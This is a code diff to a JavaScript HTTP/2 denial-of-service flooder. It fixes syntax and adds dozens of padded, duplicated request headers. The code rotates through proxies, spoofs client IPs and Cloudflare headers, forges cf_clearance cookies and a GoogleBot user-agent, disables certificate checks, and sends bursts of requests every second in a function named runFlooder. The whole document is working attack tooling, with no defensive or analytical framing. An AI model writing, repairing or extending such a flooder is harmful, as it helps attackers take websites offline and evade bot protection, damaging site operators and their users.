@@ -1128,20 +1128,20 @@ headers["upgrade-insecure-requests"] = "1";
 headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
 headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
 headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
-headers["X-Forwarded-Proto"] = HTTPS;
+headers["X-Forwarded-Proto"] = "https";
 headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
 headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
 headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
 headers["sec-ch-ua-mobile"] = "?0";
- headers["sec-ch-ua-platform"] = pl;
- headers["accept-language"] = lang;
- headers["accept-encoding"] = encoding;
- headers["upgrade-insecure-requests"] = "1";
+headers["sec-ch-ua-platform"] = pl;
+headers["accept-language"] = lang;
+headers["accept-encoding"] = encoding;
+headers["upgrade-insecure-requests"] = "1";
 headers["vary"] = randomHeaders['vary'];
 headers["x-requested-with"] = "XMLHttpRequest";
-headers["TE"] = trailers;
+headers["TE"] = "trailers";
 headers["set-cookie"] = randomHeaders['set-cookie'];
-headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15)
+headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
 headers["Server"] = randomHeaders['Server'];
 headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
 headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
@@ -1164,9 +1164,9 @@ headers["User-Agent"] = uap;
 headers["CF-Connecting-IP"] = fakeIP;
 headers["CF-RAY"] = "randomRayValue";
 headers["CF-Visitor"] = "{'scheme':'https'}";
-headers["X-Forwarded-For"] = spoofed
-headers["X-Forwarded-For"] = spoofed
-headers["X-Forwarded-For"] = spoofed
+headers["X-Forwarded-For"] = spoofed;
+headers["X-Forwarded-For"] = spoofed;
+headers["X-Forwarded-For"] = spoofed;
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
 headers[":scheme"] = "https";
@@ -1182,106 +1182,205 @@ headers["upgrade-insecure-requests"] = "1";
 headers["accept"] = accept;
 headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
 headers["referer"] = Ref;
-headers["sec-fetch-mode"] = "navigate"; 
+headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-dest"] = dest1;
 headers["sec-fetch-user"] = "?1";
 headers["TE"] = "trailers";
 headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
 headers["sec-fetch-site"] = site1;
 headers["x-requested-with"] = "XMLHttpRequest";
+headers["x-forwarded-for"] = spoofed; // Prioritize X-Forwarded-For for better anonymity
+headers["x-forwarded-host"] = parsedTarget.host;
+headers["x-forwarded-port"] = "443";
+headers["x-forwarded-server"] = parsedTarget.host;
+headers["x-request-id"] = randomString(32); // Unique ID for tracking requests
+headers["x-correlation-id"] = randomString(32); // Correlation ID for tracking requests across services
+headers["x-api-key"] = randomString(40); // Common for API authentication
+headers["x-requested-by"] = "Client"; // Can be used to denote the origin of the request
+headers["x-real-ip"] = fakeIP; // Real IP for the originating client
+headers["x-frame-options"] = "SAMEORIGIN"; // Protects against clickjacking
+headers["x-xss-protection"] = "1; mode=block"; // XSS filter
+headers["x-content-type-options"] = "nosniff"; // Prevents MIME-type sniffing
+headers["x-dns-prefetch-control"] = "on"; // DNS prefetching control
+headers["x-content-security-policy"] = "default-src 'self'"; // Content Security Policy
+headers["x-cross-origin-opener-policy"] = "same-origin"; // COOP policy
+headers["x-cross-origin-embedder-policy"] = "require-corp"; // COEP policy
+headers["x-permitted-cross-domain-policies"] = "none"; // Cross-domain policy
+headers["x-requested-with"] = "XMLHttpRequest"; // Used to identify AJAX requests
+headers["x-application-id"] = randomString(16); // Custom application ID
+headers["x-feature-flags"] = "feature1,feature2"; // Feature flags for testing
+headers["x-optimization"] = "high"; // Used to denote request optimization level
+headers["x-custom-header"] = randomString(20); // Custom header for testing
+headers["x-debug"] = "true"; // Enable debugging
+headers["x-authorization"] = "Bearer " + randomString(50); // Authorization token
+headers["x-session-id"] = randomString(32); // Session ID for tracking user sessions
+headers["x-user-token"] = randomString(50); // Token for identifying the user
+headers["x-b3-traceid"] = randomString(16); // Trace ID for distributed tracing
+headers["x-b3-spanid"] = randomString(16); // Span ID for distributed tracing
+headers["x-b3-parentspanid"] = randomString(16); // Parent Span ID for distributed tracing
+headers["x-b3-sampled"] = "1"; // Sampling for distributed tracing
+headers["x-b3-flags"] = "1"; // Flags for distributed tracing
+headers["x-envoy-expected-rq-timeout-ms"] = "15000"; // Timeout for Envoy proxies
+headers["x-envoy-retry-on"] = "5xx"; // Retry policy for Envoy proxies
+headers["x-envoy-max-retries"] = "3"; // Max retries for Envoy proxies
+headers["x-envoy-upstream-service-time"] = "500"; // Upstream service time for Envoy proxies
+headers["x-forwarded-for"] = spoofed; // Multiple instances for different proxies
+headers["x-ssl-client-cert"] = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7tR0vE+R8wD7/j9+zN7d"; // SSL client certificate (for testing)
+headers["x-timestamp"] = new Date().toISOString(); // Timestamp of the request
+headers["x-unique-request-id"] = randomString(64); // Unique identifier for tracking requests
+headers["x-b3-traceid"] = randomString(16); // Trace ID for distributed tracing
+headers["x-b3-spanid"] = randomString(16); // Span ID for distributed tracing
+headers["x-b3-parentspanid"] = randomString(16); // Parent Span ID for distributed tracing
+headers["x-b3-sampled"] = "1"; // Sampling flag for tracing
+headers["x-b3-flags"] = "1"; // Flags for distributed tracing
+headers["x-envoy-expected-rq-timeout-ms"] = "15000"; // Timeout for Envoy proxies
+headers["x-envoy-retry-on"] = "5xx"; // Retry policy for Envoy proxies
+headers["x-envoy-max-retries"] = "3"; // Max retries for Envoy proxies
+headers["x-envoy-upstream-service-time"] = "500"; // Upstream service time for Envoy proxies
+headers["x-ssl-client-cert"] = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7tR0vE+R8wD7/j9+zN7d"; // SSL client certificate
+headers["x-ssl-client-sdn"] = randomString(16); // SSL client SDN
+headers["x-ssl-client-issuer"] = "CA Certificate"; // SSL client issuer
+headers["x-forwarded-for"] = spoofed; // Multiple instances for various proxies
+headers["x-forwarded-client-cert"] = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7tR0vE+R8wD7/j9+zN7d"; // Client cert forwarded through proxy
+headers["x-cloud-trace-context"] = randomString(32) + "/" + randomString(16) + ";o=1"; // Cloud trace context
+headers["x-github-actor"] = randomString(40); // GitHub actor identifier
+headers["x-github-event"] = "push"; // GitHub event type
+headers["x-github-delivery"] = randomString(64); // GitHub delivery ID
+headers["x-remote-ip"] = fakeIP; // Remote IP for testing
+headers["x-remote-port"] = "443"; // Remote port for testing
+headers["x-client-ip"] = fakeIP; // Client IP for testing
+headers["x-real-ip"] = fakeIP; // Real IP header
+headers["x-http-method-override"] = "POST"; // Method override for testing
+headers["x-forwarded-host"] = parsedTarget.host; // Host header in proxy environments
+headers["x-authorization"] = "Bearer " + randomString(50); // Bearer token for authorization
+headers["x-requested-by"] = "Automated Tester"; // Identifies request source
+headers["x-client-cert"] = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7tR0vE+R8wD7/j9+zN7d"; // Client certificate for testing
+headers["x-custom-header"] = randomString(20); // Custom header for testing
+headers["x-feature-flags"] = "beta,experimental"; // Feature flags
+headers["x-debug"] = "true"; // Debugging flag
+headers["x-session-token"] = randomString(40); // Session token
+headers["x-client-version"] = "1.0.0"; // Client version
+headers["x-client-id"] = randomString(32); // Client ID
+headers["x-trace-id"] = randomString(64); // Trace ID for debugging
+headers["x-correlation-id"] = randomString(64); // Correlation ID
+headers["x-client-type"] = "web"; // Type of client making the request
+headers["x-request-type"] = "ajax"; // Type of request
+headers["x-request-source"] = "testing-tool"; // Source of the request
+headers["x-server-identifier"] = randomString(64); // Identifier for the server
+headers["x-environment"] = "testing"; // Environment of the request
+headers["x-security-token"] = randomString(50); // Security token for testing
+headers["x-request-id"] = randomString(64); // Unique request ID
+headers["x-client-language"] = lang; // Language of the client
+headers["x-client-encoding"] = encoding; // Encoding of the client
+headers["x-client-accept"] = accept; // Accept header of the client
+headers["x-server-name"] = "server-" + randomString(8); // Server name for testing
+headers["x-server-region"] = "us-west"; // Server region
+headers["x-server-time"] = new Date().toISOString(); // Server time
+headers["x-http-client-id"] = randomString(32); // HTTP client ID
+headers["x-http-client-secret"] = randomString(32); // HTTP client secret
+headers["x-retry-count"] = "3"; // Retry count
+headers["x-request-type"] = "manual"; // Request type
+headers["x-csrf-token"] = randomString(32); // CSRF token for testing
+headers["x-request-source"] = "automation"; // Source of the request
+headers["x-client-platform"] = "Windows"; // Platform of the client
+headers["x-client-device"] = "Desktop"; // Device type
+headers["x-client-browser"] = "Chrome"; // Browser type
+headers["x-client-version"] = "1.2.3"; // Version of the client
+headers["x-correlation-id"] = randomString(64); // Correlation ID
+
  
  function runFlooder() {
-     const proxyAddr = randomElement(proxies);
-     const parsedProxy = proxyAddr.split(":");
-         headers["origin"] = "https://" + parsedTarget.host;
+    const proxyAddr = randomElement(proxies);
+    const parsedProxy = proxyAddr.split(":");
 
-     const proxyOptions = {
-         host: parsedProxy[0],
-         port: ~~parsedProxy[1],
-         address: parsedTarget.host + ":443",
-         timeout: 100,
-     };
+    headers["origin"] = "https://" + parsedTarget.host;
 
-     Socker.HTTP(proxyOptions, (connection, error) => {
-         if (error) return
- 
-         connection.setKeepAlive(true, 600000);
+    const proxyOptions = {
+        host: parsedProxy[0],
+        port: ~~parsedProxy[1],
+        address: parsedTarget.host + ":443",
+        timeout: 100,
+    };
 
-         const tlsOptions = {
+    Socker.HTTP(proxyOptions, (connection, error) => {
+        if (error) return;
+
+        connection.setKeepAlive(true, 600000);
+
+        const tlsOptions = {
             host: parsedTarget.host,
             secure: true,
-            ALPNProtocols: ['http/1.1', 'h2', 'http/2', 'http/1.2', 'http/1'],
-            sigals: "RSA+SHA256:ECDSA+SHA256",
-            socket: connection,
+            ALPNProtocols: ['http/1.1', 'h2', 'http/2'],
+            ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384",
+            honorCipherOrder: true,
             ecdhCurve: "auto",
-            ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305",
-            honorCipherOrder: false,
-            host: parsedTarget.host,
             rejectUnauthorized: false,
-            servername: parsedTarget.host,
             secureProtocol: "TLS_method",
             session: crypto.randomBytes(64),
             timeout: 1000,
         };
 
-         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
+        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
 
-         tlsConn.setKeepAlive(true, 60000);
+        tlsConn.setKeepAlive(true, 60000);
 
-         const client = http2.connect(parsedTarget.href, {
-             protocol: "https:",
-             settings: {
-            headerTableSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
-            maxConcurrentStreams: 100,
-            initialWindowSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
-            maxFrameSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
-            enablePush: false
-          },
-             maxSessionMemory: 3333,
-             maxDeflateDynamicTableSize: 4294967295,
-             createConnection: () => tlsConn,
-             socket: connection,
-         });
- 
-         client.settings({
+        const client = http2.connect(parsedTarget.href, {
+            protocol: "https:",
+            settings: {
+                headerTableSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
+                maxConcurrentStreams: 100,
+                initialWindowSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
+                maxFrameSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
+                enablePush: false
+            },
+            maxSessionMemory: 3333,
+            maxDeflateDynamicTableSize: 4294967295,
+            createConnection: () => tlsConn,
+            socket: connection,
+        });
+
+        client.settings({
             headerTableSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
             maxConcurrentStreams: 100,
             initialWindowSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
             maxFrameSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
             enablePush: false,
-          });
- 
-         client.on("connect", () => {
-            const IntervalAttack = setInterval(() => {
+        });
+
+        client.on("connect", () => {
+            const intervalAttack = setInterval(() => {
                 const dynHeaders = {
-                  ...headers,
-                  "user-agent": uap1 + randstr(12),
-                  ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
-                  ...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],
+                    ...headers,
+                    "user-agent": uap1 + randstr(12),
+                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
+                    ...rateHeaders2[Math.floor(Math.random() * rateHeaders2.length)],
                 };
+
                 for (let i = 0; i < args.Rate; i++) {
                     headers["ja3"] = jar;
-                    const request = client.request(dynHeaders)
-                    
-                    client.on("response", response => {
+                    const request = client.request(dynHeaders);
+
+                    request.on("response", response => {
                         request.close();
                         request.destroy();
-                        return
                     });
-    
+
                     request.end();
                 }
-            }, 1000); 
-         });
- 
-         client.on("close", () => {
-             client.destroy();
-             connection.destroy();
-             return
-         });
-     }),function (error, response, body) {
-		};
- }
+            }, 1000);
+        });
+
+        client.on("close", () => {
+            client.destroy();
+            connection.destroy();
+        });
+    }, (error, response, body) => {
+        if (error) {
+        } else {
+        }
+    });
+}
+
  
  const KillScript = () => process.exit(1);
  
